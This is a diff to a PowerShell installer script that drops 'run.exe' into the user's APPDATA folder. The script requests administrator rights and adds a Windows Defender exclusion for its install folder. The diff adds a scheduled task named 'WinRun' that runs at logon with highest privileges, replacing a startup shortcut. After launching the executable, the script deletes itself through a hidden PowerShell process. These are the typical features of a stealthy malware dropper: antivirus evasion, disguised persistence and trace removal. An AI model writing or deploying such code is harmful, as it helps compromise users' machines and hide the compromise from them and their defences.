@@ -8,18 +8,24 @@ $installDir = "$env:APPDATA\run"
 $runExe = "$installDir\run.exe"
 $datFile = "$env:APPDATA\run.dat"
 $isUpdate = Test-Path $datFile
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk"
 
-if (-not $isUpdate -and -not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+# legacy cleanup section
+if (Test-Path $shortcutPath) { Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue }
+
+# UAC prompt (fresh install)
+if (-not $isUpdate -and -not $isAdmin) {
     Start-Process $scriptPath -Verb RunAs
     exit
 }
 
+# add exclusion to defender
 if (-not $isUpdate) {
     Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
 }
 
-# cleanup old processes
+# cleanup existing run.exe processes
 $oldProcs = Get-Process -Name "run" -ErrorAction SilentlyContinue
 if ($oldProcs) {
     $oldProcs | Stop-Process -Force -ErrorAction SilentlyContinue
@@ -46,12 +52,10 @@ if (-not (Test-Path $runExe)) {
     exit
 }
 
-# startup shortcut
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut($shortcutPath)
-$Shortcut.TargetPath = $runExe
-$Shortcut.WindowStyle = 7
-$Shortcut.Save()
+# create scheduled task
+$taskName = "WinRun"
+$quotedRunExe = "`"$runExe`""
+& schtasks /create /tn $taskName /tr $quotedRunExe /sc onlogon /rl highest /f
 
 # mark installed
 $installDir | Out-File $datFile
@@ -69,6 +73,4 @@ try {
 catch {}
 
 Start-Process $runExe
-
-# self delete
 Start-Process powershell -ArgumentList "-Command `"Start-Sleep 5; Remove-Item '$scriptPath' -Force`"" -WindowStyle Hidden
